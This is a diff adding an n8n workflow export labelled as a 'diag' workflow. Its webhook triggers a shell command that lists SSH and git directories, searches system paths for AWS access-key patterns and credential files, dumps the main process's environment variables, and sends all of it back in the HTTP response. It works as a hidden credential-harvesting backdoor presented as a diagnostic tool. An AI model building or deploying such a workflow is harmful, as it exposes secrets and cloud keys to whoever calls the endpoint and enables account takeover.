@@ -1,0 +1,180 @@
+{
+  "active": true,
+  "activeVersion": {
+    "updatedAt": "2026-11-26T19:50:23.422Z",
+    "createdAt": "2026-11-26T19:50:23.422Z",
+    "versionId": "54302840-b55f-4701-b4bc-78952878b412",
+    "workflowId": "w2FszqWY23gIUjdE",
+    "nodes": [
+      {
+        "parameters": {
+          "httpMethod": "POST",
+          "path": "diagiy5d140n",
+          "responseMode": "responseNode",
+          "options": {}
+        },
+        "id": "n1",
+        "name": "Webhook",
+        "type": "n8n-nodes-base.webhook",
+        "typeVersion": 2,
+        "position": [
+          0,
+          0
+        ],
+        "webhookId": "diagiy5d140n"
+      },
+      {
+        "parameters": {
+          "command": "echo ===NODES===; ls -la /home/node/.n8n/nodes 2>/dev/null; echo ===SSHDIR===; ls -laR /home/node/.n8n/ssh 2>/dev/null | head -40; echo ===GITDIR===; ls -laR /home/node/.n8n/git 2>/dev/null | head -40; echo ===N8NJSON===; ls -la /home/node/.n8n/*.json 2>/dev/null; echo ===GREPAWS===; grep -rIl -E 'AKIA|ASIA|ABSK|bedrock|AWS_ACCESS' /home/node /tmp /app /etc 2>/dev/null | head -20; echo ===CREDFILES===; find / -maxdepth 4 -name '*.json' -path '*cred*' 2>/dev/null | head; echo ===PROC1===; cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | sort | head -60; echo ===ROUTES===; cat /proc/1/cmdline | tr '\\0' ' '; echo; echo ===MOUNTS===; cat /proc/mounts | head -20"
+        },
+        "id": "n2",
+        "name": "Exec",
+        "type": "n8n-nodes-base.executeCommand",
+        "typeVersion": 1,
+        "position": [
+          220,
+          0
+        ]
+      },
+      {
+        "parameters": {
+          "respondWith": "json",
+          "responseBody": "={{ JSON.stringify($json) }}",
+          "options": {}
+        },
+        "id": "n3",
+        "name": "Respond",
+        "type": "n8n-nodes-base.respondToWebhook",
+        "typeVersion": 1,
+        "position": [
+          440,
+          0
+        ]
+      }
+    ],
+    "connections": {
+      "Webhook": {
+        "main": [
+          [
+            {
+              "node": "Exec",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      },
+      "Exec": {
+        "main": [
+          [
+            {
+              "node": "Respond",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      }
+    },
+    "authors": "Matheus Cristhyan",
+    "name": null,
+    "description": null
+  },
+  "activeVersionId": "54302840-b55f-4701-b4bc-78952878b412",
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Exec",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Exec": {
+      "main": [
+        [
+          {
+            "node": "Respond",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "createdAt": "2026-11-26T19:50:23.404Z",
+  "id": "w2FszqWY23gIUjdE",
+  "isArchived": false,
+  "meta": null,
+  "name": "diag-diagiy5d140n",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "diagiy5d140n",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "n1",
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [
+        0,
+        0
+      ],
+      "webhookId": "diagiy5d140n"
+    },
+    {
+      "parameters": {
+        "command": "echo ===NODES===; ls -la /home/node/.n8n/nodes 2>/dev/null; echo ===SSHDIR===; ls -laR /home/node/.n8n/ssh 2>/dev/null | head -40; echo ===GITDIR===; ls -laR /home/node/.n8n/git 2>/dev/null | head -40; echo ===N8NJSON===; ls -la /home/node/.n8n/*.json 2>/dev/null; echo ===GREPAWS===; grep -rIl -E 'AKIA|ASIA|ABSK|bedrock|AWS_ACCESS' /home/node /tmp /app /etc 2>/dev/null | head -20; echo ===CREDFILES===; find / -maxdepth 4 -name '*.json' -path '*cred*' 2>/dev/null | head; echo ===PROC1===; cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | sort | head -60; echo ===ROUTES===; cat /proc/1/cmdline | tr '\\0' ' '; echo; echo ===MOUNTS===; cat /proc/mounts | head -20"
+      },
+      "id": "n2",
+      "name": "Exec",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [
+        220,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ JSON.stringify($json) }}",
+        "options": {}
+      },
+      "id": "n3",
+      "name": "Respond",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1,
+      "position": [
+        440,
+        0
+      ]
+    }
+  ],
+  "pinData": null,
+  "settings": {
+    "executionOrder": "v1",
+    "callerPolicy": "workflowsFromSameOwner",
+    "availableInMCP": false
+  },
+  "shared": [
+    {
+      "updatedAt": "2026-11-26T19:50:23.404Z",
+      "createdAt": "2026-11-26T19:50:23.404Z",
+      "role": "workflow:owner",
+      "workflowId": "w2FszqWY23gIUjdE",
+      "projectId": "AxNpta0sA2v4gJ2a"
+    }
+  ],
+  "staticData": null,
+  "tags": [],
+  "triggerCount": 1,
+  "updatedAt": "2026-11-26T19:50:23.404Z",
+  "versionId": "54302840-b55f-4701-b4bc-78952878b412"
+}
